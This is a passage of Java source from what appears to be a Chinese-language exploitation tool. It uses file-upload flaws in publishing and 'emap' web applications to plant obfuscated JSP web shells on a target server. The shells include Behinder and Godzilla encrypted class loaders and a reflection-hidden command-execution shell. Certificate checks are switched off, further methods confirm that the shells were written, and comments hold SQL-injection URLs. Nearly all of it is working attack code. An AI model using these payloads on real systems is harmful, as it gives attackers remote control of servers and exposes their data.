            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);
            //  System.setProperty("http.proxyHost", "127.0.0.1");
            // System.setProperty("http.proxyPort", "8080");
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            URL url1 = new URL(url + "/publishing/publishing/material/file/video");
            String boundary = "dd8f988919484abab3816881c55272a7";
            String json = "<%! public byte[] A899L(String Strings,String k) { try {javax.crypto.Cipher B3kV7p = javax.crypto.Cipher.getInstance(\"AES/ECB/PKCS5Padding\");B3kV7p.init(javax.crypto.Cipher.DECRYPT_MODE, (javax.crypto.spec.SecretKeySpec) Class.forName(\"javax.crypto.spec.SecretKeySpec\").getConstructor(byte[].class, String.class).newInstance(k.getBytes(), \"AES\"));int[] aa = new int[]{99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98};String ccstr = \"\";for (int i = 0; i < aa.length; i++) { aa[i] = aa[i] ^ 0x010;ccstr = ccstr + (char) aa[i];}byte[] bytes = (byte[]) Class.forName(ccstr).getMethod(\"decodeBuffer\", String.class).invoke(Class.forName(ccstr).newInstance(), Strings);byte[] result = (byte[]) B3kV7p.getClass()./*ZV3y10Q2a3*/getDeclaredMethod/*ZV3y10Q2a3*/(\"doFinal\", new Class[]{byte[].class}).invoke(B3kV7p,new Object[]{bytes});return result;} catch (Exception e) {e.printStackTrace();return null;} } %><%  try {  String K03727E = \"5f4dcc3b5aa765d6\";  session.putValue(\"u\", K03727E);  byte[] I817PA6 = A899L (request.getReader().readLine(),K03727E);  java./*ZV3y10Q2a3*/lang./*ZV3y10Q2a3*/reflect.Method A899L = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod/*ZV3y10Q2a3*/(\"defineClass\",byte[].class,int/**/.class,int/**/.class);  A899L.setAccessible(true);  Class i = (Class)A899L.invoke(Thread.currentThread()./*ZV3y10Q2a3*/getContextClassLoader(), I817PA6 , 0, I817PA6.length);  Object Q059 = i./*ZV3y10Q2a3*/newInstance();  Q059.equals(pageContext); } catch (Exception e) {response.sendError(404);} %>";
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());
            outputStream.writeBytes("--" + boundary + "\r\n");
            outputStream.writeBytes("Content-Disposition: form-data; name=\"Filedata\"; filename=\"Test.jsp\"\r\n\r\n");
            outputStream.writeBytes(json + "\r\n");

            outputStream.writeBytes("--" + boundary + "\r\n");
            outputStream.writeBytes("Content-Disposition: form-data; name=\"Submit\"\r\n\r\n");
            outputStream.writeBytes(json + "\r\n");
            outputStream.flush();
            outputStream.close();
            outputStream.writeBytes("--" + boundary + "--\r\n");
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            String inputLine;
            response.append(inputLine = br.readLine());
            while ((inputLine = br.readLine()) != null) {
            }
            response.append(inputLine);


            int responseCode = connection.getResponseCode();

            if (response.toString().contains("path")) {


                cmd1.appendText(formattedDateTime + "冰蝎写入成功" + url + "/publishingImg" + "密码：password" + "\n");
                cmd1.appendText(formattedDateTime + response.toString());
            } else {
                cmd1.appendText(formattedDateTime + "冰蝎写入失败" + "\n");

            }


            //    cmd1.appendText(response.toString());
            //  String pattern = "<code>\\s*1\\s*</code>";
            //  Pattern r = Pattern.compile(pattern);
            //   Matcher m = r.matcher(response.toString());

            //   if (m.find()) {


        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            cmd1.appendText(formattedDateTime + "冰蝎写入失败null" + "\n");
            e.printStackTrace();
        }

    }

    public void video3() {

        String url = test2.getText();
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
        }
        try {

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);
            //  System.setProperty("http.proxyHost", "127.0.0.1");
            // System.setProperty("http.proxyPort", "8080");
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            URL url1 = new URL(url + "/publishing/publishing/material/file/video");
            String boundary = "dd8f988919484abab3816881c55272a7";
            String json = "<%  Class<?> CcK2 = Class.forName(new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101}));java.lang.reflect.Method EPlvD393 = CcK2.getMethod(new String(new byte[]{101, 120, 101, 99}), String.class);Object GKmB5mMt = EPlvD393.invoke( CcK2.getMethod(new String(new byte[]{103, 101, 116, 82, 117, 110, 116, 105, 109, 101})).invoke(null, new Object[]{}), new Object[]{request.getParameter(\"password\")});java.lang.reflect.Method QE7E = GKmB5mMt.getClass().getMethod(new String(new byte[]{103, 101, 116, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109}));QE7E.setAccessible(true);java.util.Scanner s = new java.util.Scanner((java.io.InputStream) QE7E.invoke(GKmB5mMt, new Object[]{})).useDelimiter(\"A\");String result = s.hasNext() ? s.next() : \"\";out.print(\"<pre>\");out.print(result);out.print(\"</pre>\"); %>";
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());
            outputStream.writeBytes("--" + boundary + "\r\n");
            outputStream.writeBytes("Content-Disposition: form-data; name=\"Filedata\"; filename=\"Test.jsp\"\r\n\r\n");
            outputStream.writeBytes(json + "\r\n");

            outputStream.writeBytes("--" + boundary + "\r\n");
            outputStream.writeBytes("Content-Disposition: form-data; name=\"Submit\"\r\n\r\n");
            outputStream.writeBytes(json + "\r\n");
            outputStream.flush();
            outputStream.close();
            outputStream.writeBytes("--" + boundary + "--\r\n");
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            String inputLine;
            response.append(inputLine = br.readLine());
            while ((inputLine = br.readLine()) != null) {
            }
            response.append(inputLine);


            int responseCode = connection.getResponseCode();

            if (response.toString().contains("path")) {


                cmd1.appendText(formattedDateTime + "jspcmdshell写入成功" + url + "/publishingImg" + "密码：password" + "\n");
                cmd1.appendText(formattedDateTime + response.toString());
            } else {
                cmd1.appendText(formattedDateTime + "jspcmdshell写入失败" + "\n");

            }


            //    cmd1.appendText(response.toString());
            //  String pattern = "<code>\\s*1\\s*</code>";
            //  Pattern r = Pattern.compile(pattern);
            //   Matcher m = r.matcher(response.toString());

            //   if (m.find()) {


        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            cmd1.appendText(formattedDateTime + "jspcmdshell写入失败null" + "\n");
            e.printStackTrace();
        }

    }

    public void video4() {

        String url = test2.getText();
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
        }
        try {

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);
            //  System.setProperty("http.proxyHost", "127.0.0.1");
            // System.setProperty("http.proxyPort", "8080");
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            URL url1 = new URL(url + "/publishing/publishing/material/file/video");
            String boundary = "dd8f988919484abab3816881c55272a7";
            String json = "Test files hello ≥Ö‿Ö≤";
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());
            outputStream.writeBytes("--" + boundary + "\r\n");
            outputStream.writeBytes("Content-Disposition: form-data; name=\"Filedata\"; filename=\"Test.jsp\"\r\n\r\n");
            outputStream.writeBytes(json + "\r\n");

            outputStream.writeBytes("--" + boundary + "\r\n");
            outputStream.writeBytes("Content-Disposition: form-data; name=\"Submit\"\r\n\r\n");
            outputStream.writeBytes(json + "\r\n");
            outputStream.flush();
            outputStream.close();
            outputStream.writeBytes("--" + boundary + "--\r\n");
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            String inputLine;
            response.append(inputLine = br.readLine());
            while ((inputLine = br.readLine()) != null) {
            }
            response.append(inputLine);


            int responseCode = connection.getResponseCode();

            if (response.toString().contains("path")) {


                cmd1.appendText(formattedDateTime + "测试文件写入成功" + url + "/publishingImg" + "密码：password" + "\n");
                cmd1.appendText(formattedDateTime + response.toString());
            } else {
                cmd1.appendText(formattedDateTime + "测试文件写入失败" + "\n");

            }


            //    cmd1.appendText(response.toString());
            //  String pattern = "<code>\\s*1\\s*</code>";
            //  Pattern r = Pattern.compile(pattern);
            //   Matcher m = r.matcher(response.toString());

            //   if (m.find()) {


        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            cmd1.appendText(formattedDateTime + "测试文件写入失败null" + "\n");
      //      e.printStackTrace();
        }

    }

    public void gslbug() {

        try {


            //   if(test2.getText().equals("")){

            //  Alert alert = new Alert(Alert.AlertType.ERROR);

            //   alert.setHeaderText("");
            //  alert.setContentText("请输入目标");
            // alert.showAndWait();

            //  } else {

            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);


            //   System.setProperty("http.proxyHost", "127.0.0.1");
            //   System.setProperty("http.proxyPort", "8080");

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);

            String url = test2.getText();
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
            }
            URL url1 = new URL(url + "/upload/g.jsp");
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            String inputLine;
            response.append(inputLine = br.readLine());
            while ((inputLine = br.readLine()) != null) {

                response.append(inputLine);
                //    test1.appendText(response.toString());


            }
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {

                cmd1.appendText(formattedDateTime + "哥斯拉写入成功" + url + "/upload/g.jsp" + "密码password" + "\n");
                //    test1.appendText(formattedDateTime + url + "/portal/attachment_clearTempFile.action?bean.RecId=1%27)%20AND%20EXTRACTVALUE(8841,CONCAT(0x7e,user(),0x7e))%20AND%20(%27mYhO%27=%27mYhO&bean.TabName=1" + "\n");

            } else {

                cmd1.appendText(formattedDateTime + "哥斯拉写入失败" + "\n");
            }


        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            cmd1.appendText(formattedDateTime + "哥斯拉写入失败null" + "\n");


        }
    }

    public void bxbug() {

        try {


            //   if(test2.getText().equals("")){

            //  Alert alert = new Alert(Alert.AlertType.ERROR);

            //   alert.setHeaderText("");
            //  alert.setContentText("请输入目标");
            // alert.showAndWait();

            //  } else {

            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);


            //   System.setProperty("http.proxyHost", "127.0.0.1");
            //   System.setProperty("http.proxyPort", "8080");

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);

            String url = test2.getText();
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
            }
            URL url1 = new URL(url + "/upload/b.jsp");
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            String inputLine;
            response.append(inputLine = br.readLine());
            while ((inputLine = br.readLine()) != null) {

                response.append(inputLine);
                //    test1.appendText(response.toString());


            }
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {

                cmd1.appendText(formattedDateTime + " 冰蝎写入成功" + url + "/upload/b.jsp" + "密码password" + "\n");
                //    test1.appendText(formattedDateTime + url + "/portal/attachment_clearTempFile.action?bean.RecId=1%27)%20AND%20EXTRACTVALUE(8841,CONCAT(0x7e,user(),0x7e))%20AND%20(%27mYhO%27=%27mYhO&bean.TabName=1" + "\n");

            } else {

                cmd1.appendText(formattedDateTime + "冰蝎写入失败" + "\n");
            }


        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            cmd1.appendText(formattedDateTime + "冰蝎写入失败null" + "\n");


        }


    }

    public void jspshellbug() {

        try {


            //   if(test2.getText().equals("")){

            //  Alert alert = new Alert(Alert.AlertType.ERROR);

            //   alert.setHeaderText("");
            //  alert.setContentText("请输入目标");
            // alert.showAndWait();

            //  } else {

            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);


            //   System.setProperty("http.proxyHost", "127.0.0.1");
            //   System.setProperty("http.proxyPort", "8080");

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);

            String url = test2.getText();
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
            }
            URL url1 = new URL(url + "/upload/j.jsp");
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            String inputLine;
            response.append(inputLine = br.readLine());
            while ((inputLine = br.readLine()) != null) {

                response.append(inputLine);
                //    test1.appendText(response.toString());


            }
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                //    if (response.toString() != "") {

                cmd1.appendText(formattedDateTime + " jspcmdshell写入成功" + url + "/upload/j.jsp" + "密码password" + "\n");
                //    test1.appendText(formattedDateTime + url + "/portal/attachment_clearTempFile.action?bean.RecId=1%27)%20AND%20EXTRACTVALUE(8841,CONCAT(0x7e,user(),0x7e))%20AND%20(%27mYhO%27=%27mYhO&bean.TabName=1" + "\n");

            } else {

                cmd1.appendText(formattedDateTime + "jspcmdshell写入失败" + "\n");
            }


        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            cmd1.appendText(formattedDateTime + "jspcmdshell写入失败null" + "\n");


        }

    }

    public void ceshibug() {

        try {


            //   if(test2.getText().equals("")){

            //  Alert alert = new Alert(Alert.AlertType.ERROR);

            //   alert.setHeaderText("");
            //  alert.setContentText("请输入目标");
            // alert.showAndWait();

            //  } else {

            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);


            //   System.setProperty("http.proxyHost", "127.0.0.1");
            //   System.setProperty("http.proxyPort", "8080");

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);

            String url = test2.getText();
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
            }
            URL url1 = new URL(url + "/upload/c.jsp");
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            String inputLine;
            response.append(inputLine = br.readLine());
            while ((inputLine = br.readLine()) != null) {

                response.append(inputLine);
                //    test1.appendText(response.toString());


            }
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                //    if (response.toString() != "") {

                cmd1.appendText(formattedDateTime + " 测试文件写入成功" + url + "/upload/c.jsp" + "\n");
                //    test1.appendText(formattedDateTime + url + "/portal/attachment_clearTempFile.action?bean.RecId=1%27)%20AND%20EXTRACTVALUE(8841,CONCAT(0x7e,user(),0x7e))%20AND%20(%27mYhO%27=%27mYhO&bean.TabName=1" + "\n");

            } else {

                cmd1.appendText(formattedDateTime + "测试文件写入失败" + "\n");
            }


        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            cmd1.appendText(formattedDateTime + "测试文件写入失败null" + "\n");


        }


    }

    public void emap1() {


        String url = test2.getText();
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
        }
        try {

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);
            //  System.setProperty("http.proxyHost", "127.0.0.1");
            // System.setProperty("http.proxyPort", "8080");
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            URL url1 = new URL(url + "/emap/devicePoint_addImgIco?hasSubsystem=true");
            HttpURLConnection con = (HttpURLConnection) url1.openConnection();
            con.setRequestMethod("POST");
            con.setDoOutput(true);
            String boundary = "A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT";
            String postData = "--" + boundary + "\r\n" +
                    "Content-Disposition: form-data; name=\"upload\"; filename=\"1ndex.jsp\"\r\n" +
                    "Content-Type: application/octet-stream\r\n" +
                    "Content-Transfer-Encoding: binary\r\n\r\n" +
                    "<%! String xc = \"5f4dcc3b5aa765d6\";class X extends ClassLoader {public X(ClassLoader z) {super(z); }public Class Q(byte[] cb) {return super.defineClass(cb, 0, cb.length);}}public byte[] x(byte[] s, boolean m) {try {javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(\"AES\");Class<?> aClass = Class.forName(\"javax.crypto.spec.SecretKeySpec\");java.lang.reflect.Constructor<?>constructor = aClass.getConstructor(byte[].class, String.class);javax.crypto.spec.SecretKeySpec skeySpec = (javax.crypto.spec.SecretKeySpec) constructor.newInstance(xc.getBytes(), \"AES\");c.init(m ? 1 : 2, skeySpec);byte[] result = (byte[]) c.getClass()./*Z5T0ynvHb5*/getDeclaredMethod/*Z5T0ynvHb5*/(\"doFinal\", new Class[]{byte[].class}).invoke(c, new Object[]{s});return result; } catch (Exception e) {return null;}} %><%  try {byte[] C707 = new byte[Integer.parseInt(request.getHeader(\"Content-Length\"))]; java.io.InputStream inputStream = request.getInputStream(); int _num = 0; while ((_num += inputStream.read(C707, _num, C707.length)) < C707.length) ; C707 = x(C707, false); if (session.getAttribute(\"payload\") == null) {session.setAttribute(\"payload\", new X(Thread.currentThread()./*Z5T0ynvHb5*/getContextClassLoader()).Q(C707)); } else {request.setAttribute(\"parameters\", C707);Object f = ((Class) session.getAttribute(\"payload\")).newInstance();java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();f.equals(/*Z5T0ynvHb5*/arrOut);f.equals(/*Z5T0ynvHb5*/pageContext);f.toString();response.getOutputStream().write(x(arrOut.toByteArray(), true)); }} catch (Exception e) {} %>\r\n" +
                    "--" + boundary + "--";

            con.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            try (DataOutputStream wr = new DataOutputStream(con.getOutputStream())) {
                wr.write(postData.getBytes());
            }
            BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();

            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            in.close();

            int responseCode = con.getResponseCode();
            String jsonStr = response.toString();
            JSONObject jsonObject = JSONObject.fromObject(jsonStr);
            String aa=jsonObject.getString("data");







            if (response.toString().contains("data")) {





                cmd1.appendText(formattedDateTime + "哥斯拉写入成功" + url +":8314"+ "/upload/emap/society_new" +"/"+aa+"密码password" +"\n");
               // cmd1.appendText(formattedDateTime + response.toString() + "\n");


            } else {

                cmd1.appendText(formattedDateTime + "哥斯拉写入失败" + url + "\n");
                //   cmd1.appendText(formattedDateTime + response.toString() + "\n");
            }

        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            cmd1.appendText(formattedDateTime + "哥斯拉写入失败-" + url + "\n");
        }


    }

    public void emap2() {

        String url = test2.getText();
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
        }
        try {

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);
            //  System.setProperty("http.proxyHost", "127.0.0.1");
            // System.setProperty("http.proxyPort", "8080");
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            URL url1 = new URL(url + "/emap/devicePoint_addImgIco?hasSubsystem=true");
            HttpURLConnection con = (HttpURLConnection) url1.openConnection();
            con.setRequestMethod("POST");
            con.setDoOutput(true);
            String boundary = "A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT";
            String postData = "--" + boundary + "\r\n" +
                    "Content-Disposition: form-data; name=\"upload\"; filename=\"1ndex1.jsp\"\r\n" +
                    "Content-Type: application/octet-stream\r\n" +
                    "Content-Transfer-Encoding: binary\r\n\r\n" +
                    "<%! public byte[] A899L(String Strings,String k) { try {javax.crypto.Cipher B3kV7p = javax.crypto.Cipher.getInstance(\"AES/ECB/PKCS5Padding\");B3kV7p.init(javax.crypto.Cipher.DECRYPT_MODE, (javax.crypto.spec.SecretKeySpec) Class.forName(\"javax.crypto.spec.SecretKeySpec\").getConstructor(byte[].class, String.class).newInstance(k.getBytes(), \"AES\"));int[] aa = new int[]{99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98};String ccstr = \"\";for (int i = 0; i < aa.length; i++) { aa[i] = aa[i] ^ 0x010;ccstr = ccstr + (char) aa[i];}byte[] bytes = (byte[]) Class.forName(ccstr).getMethod(\"decodeBuffer\", String.class).invoke(Class.forName(ccstr).newInstance(), Strings);byte[] result = (byte[]) B3kV7p.getClass()./*ZV3y10Q2a3*/getDeclaredMethod/*ZV3y10Q2a3*/(\"doFinal\", new Class[]{byte[].class}).invoke(B3kV7p,new Object[]{bytes});return result;} catch (Exception e) {e.printStackTrace();return null;} } %><%  try {  String K03727E = \"5f4dcc3b5aa765d6\";  session.putValue(\"u\", K03727E);  byte[] I817PA6 = A899L (request.getReader().readLine(),K03727E);  java./*ZV3y10Q2a3*/lang./*ZV3y10Q2a3*/reflect.Method A899L = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod/*ZV3y10Q2a3*/(\"defineClass\",byte[].class,int/**/.class,int/**/.class);  A899L.setAccessible(true);  Class i = (Class)A899L.invoke(Thread.currentThread()./*ZV3y10Q2a3*/getContextClassLoader(), I817PA6 , 0, I817PA6.length);  Object Q059 = i./*ZV3y10Q2a3*/newInstance();  Q059.equals(pageContext); } catch (Exception e) {response.sendError(404);} %>\r\n" +
                    "--" + boundary + "--";

            con.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            try (DataOutputStream wr = new DataOutputStream(con.getOutputStream())) {
                wr.write(postData.getBytes());
            }
            BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();

            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }

            int responseCode = con.getResponseCode();
            String jsonStr = response.toString();
            JSONObject jsonObject = JSONObject.fromObject(jsonStr);
            String aa=jsonObject.getString("data");

            if (response.toString().contains("data")) {

                cmd1.appendText(formattedDateTime + "冰蝎写入成功" + url +":8314"+ "/upload/emap/society_new" +"/"+aa+ "密码password"+"\n");
